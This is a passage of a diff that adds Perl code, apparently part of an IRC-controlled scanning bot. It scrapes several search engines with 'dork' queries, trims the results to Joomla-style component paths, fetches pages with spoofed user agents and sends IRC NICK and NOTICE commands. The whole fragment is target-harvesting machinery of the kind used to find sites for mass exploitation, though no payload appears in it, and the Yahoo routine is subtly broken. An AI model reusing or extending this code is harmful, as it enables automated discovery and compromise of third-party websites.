+            if ( $1 !~ /hotbot\.com/) {
+                my $k    = $1;
+                my @grep = links($k, $bs);
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+
+#sub altavista(){
+#    my @lst;
+#    my $key = $_[0]; my $bs = $_[1];
+#    my $b   = 0;
+#    for ($b=1; $b<=1000; $b+=10){
+#        my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
+#        my $Res=query($AlT);
+#        while ($Res=~m/<a\sclass=\'res\'\shref=\'http:\/\/av\.rds\.yahoo\.com(.+?)\*\*http\%3a\/\/(.+?)\'/g){
+#            if ($1 !~ /altavista/){
+#                my $k=$2;
+#                my @grep=links($k, $bs);
+#                push(@lst,@grep);
+#            }
+#		}
+#	}
+#return @lst;
+#}
+
+sub ask() {
+    my @lst;
+    my $key = $_[0]; my $bs = $_[1];
+    my $b   = 0;
+    my $pg  = 0;
+    for ($b=1; $b<=1000; $b+=100) {
+        my $Ask = ("http://uk.ask.com/web?q=".key($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$b."&jss=");
+        my $Res = query($Ask);
+        while ($Res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
+            if ($1 !~ /ask\.com/){
+				my $k = $1;
+				my @grep = links($k, $bs);
+				push( @lst, @grep );
+			}
+        }
+    }
+    return @lst;
+}
+
+sub lycos() {
+	my @lst;
+	my $key = $_[0]; my $bs = $_[1];
+    	my $b   = 0;
+	for ($b=0; $b<=50; $b+=1) {
+        my $lyc = ("http://search.lycos.com/web?q=".key($key)."&pn=".$b);
+        my $Res = query($lyc);
+        while ($Res =~ m/title=\"http:\/\/(.*?)\"/g) {
+            if ($1 !~ /lycos\.com/){
+                my $k = $1;
+                my @grep = links($k, $bs);
+                push(@lst, @grep);
+            }
+        }
+    }
+    return @lst;
+}
+
+sub yahoo() {
+	my @lst;
+	my $key = $_[0]; my $bs = $_[1];
+    my $b   = 0;
+	for ($b=1; $b<=1000; $b+=10) {
+        my $yahoo = ("http://search.yahoo.com/search?p=".&key($key)."&b=".$b);
+        my $Res = query($yahoo);
+        while ($Res =~ m/http\%3a\/\/(.+?)\"/g) {
+            if ($1 !~ /yahoo\.com/){
+                my $k = $2;
+                my @grep = links($k, $bs);
+                push(@lst, @grep);
+            }
+        }
+    }
+    return @lst;
+}
+
+sub links() {
+	my @l;
+	my $link = $_[0];
+	$link =~ s/\&amp\;/\&/g;
+	$link = urldecode($link);
+	if ( !$_[1] ) {
+	my $host = $link;
+	my $hdir = $link;
+	$hdir =~ s/(.*)\/[^\/]*$/\1/;
+	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+	$host .= "/";
+	$link .= "/";
+	$hdir .= "/";
+	$host =~ s/\/\//\//g;
+	$hdir =~ s/\/\//\//g;
+	$link =~ s/\/\//\//g;
+	push( @l, $host, $hdir );
+	}
+	push( @l, $link );
+	return @l;
+}
+
+sub key() {
+	my $dork = $_[0];
+	$dork =~ s/ /\+/g;
+	$dork =~ s/:/\%3A/g;
+	$dork =~ s/\//\%2F/g;
+	$dork =~ s/&/\%26/g;
+	$dork =~ s/\"/\%22/g;
+	$dork =~ s/,/\%2C/g;
+	$dork =~ s/\\/\%5C/g;
+	$dork =~ s/\n//g;
+	$dork =~ s/\r//g;
+	$dork =~ s/\t//g;
+	return $dork;
+}
+
+
+sub limpa() {
+	my $site = $_[0];
+	if ($site =~ m/\.php/) {
+		$site =~ s/\.php.*//g;
+		$site =~ m/.+(\/.+)/;
+		my $b = $1;
+		$site =~ s/$b//g;
+		$site .= "/";
+	}
+	$site =~ s/\/\?option.+//g;
+	$site .= "/";
+	$site =~ s/\?component.+//g;
+	$site =~ s/\/component\/option.+//g;
+	$site .= "/";
+	$site =~ s/\/\//\//g;
+	$site =~ s/\/\//\//g;
+	return $site;
+}
+
+
+sub str_replace {
+	my $replace_this = shift;
+	my $with_this  = shift; 
+	my $string   = shift;
+	
+	my $length = length($string);
+	my $target = length($replace_this);
+	
+	for(my $i=0; $i<$length - $target + 1; $i++) {
+		if(substr($string,$i,$target) eq $replace_this) {
+			$string = substr($string,0,$i) . $with_this . substr($string,$i+$target);
+			return $string; #Comment this if you what a global replace
+		}
+	}
+	return $string;
+}
+
+sub query($) {
+	my $url = $_[0];
+	$url =~ s/http:\/\///;
+	my $host  = $url;
+	my $query = $url;
+	my $page  = "";
+	$host  =~ s/href=\"?http:\/\///;
+	$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+	$query =~ s/$host//;
+	if ( $query eq "" ) { $query = "/"; }
+		eval {
+			my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
+			print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
+			my @r = <$sock>;
+			$page = "@r";
+			close($sock);
+		};
+	return $page;
+}
+
+sub query2($) {
+	my $url = $_[0];
+	$url =~ s/http:\/\///;
+	my $host  = $url;
+	my $query = $url;
+	my $page  = "";
+	$host  =~ s/href=\"?http:\/\///;
+	$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+	$query =~ s/$host//;
+	if ( $query eq "" ) { $query = "/"; }
+		eval {
+			my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
+			print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16\r\n\r\n";
+			my @r = <$sock>;
+			$page = "@r";
+			close($sock);
+		};
+	return $page;
+}
+
+#User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16
+
+
+
+sub calculate {
+	my @calculate = ();
+	my %visti = ();
+	foreach my $element (@_) {
+		$element =~ s/\/+/\//g;
+		next if $visti{$element}++;
+		push @calculate, $element;
+	}
+	return @calculate;
+}
+
+sub serv_iguais { #by hauguen
+	my @calculate = ();
+	my %visti = ();
+	my $treko;
+	my $verisign;
+	foreach my $element (@_) {
+		$element =~ s/\/+/\//g;
+		$treko = $element;
+		$treko =~ m/^(.+?)\=/;
+		$verisign = $1;
+		next if $visti{$verisign}++;
+		push @calculate, $element;
+	}
+	return @calculate;
+}
+
+sub nick {
+	return unless $#_ == 0;
+	sendraw("NICK $_[0]");
+}
+
+sub notice {
+	return unless $#_ == 1;
+	sendraw("NOTICE $_[0] :$_[1]");
+}
